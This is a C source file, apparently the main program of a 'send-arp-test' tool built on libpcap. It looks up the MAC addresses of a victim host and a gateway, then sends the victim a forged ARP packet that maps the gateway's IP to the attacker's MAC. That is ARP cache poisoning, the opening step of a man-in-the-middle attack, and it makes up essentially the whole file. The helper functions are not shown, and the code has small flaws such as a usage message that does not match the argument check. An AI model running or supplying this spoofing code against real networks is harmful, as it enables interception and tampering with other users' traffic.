#include "pch.h"
#include "send_arp.h"
#include "mac.h"
#include "ip.h"
void usage()
{
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		usage();
		return -1;
	}
	u_int8_t attacker_mac[6];
	u_int8_t victim_mac[6];
	u_int8_t gate_mac[6];
	u_int8_t broad_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	u_int8_t empty_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	u_int8_t attacker_ip[4];
	u_int8_t victim_ip[4];
	u_int8_t gate_ip[4];

	char *dev = argv[1];
	argv_ip(argv[2], victim_ip);
	argv_ip(argv[3], gate_ip);
	my_mac(dev, attacker_mac);
	s_getIpAddress(dev, attacker_ip);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, gate_ip, 0);
	reply(dev, pcap, gate_mac, gate_ip);
	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, victim_ip, 0);
	reply(dev, pcap, victim_mac);
	request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);

	printf("attacker ip addr : ");
	print_ip(attacker_ip);
	printf("sender ip addr : ");
	print_ip(victim_ip);
	printf("target ip addr : ");
	print_ip(gate_ip);

	printf("attacker mac addr : ");
	print_mac(attacker_mac);
	printf("sender mac addr : ");
	print_mac(victim_mac);
	printf("target mac addr : ");
	print_mac(gate_mac);

	return 0;
	pcap_close(pcap);
}
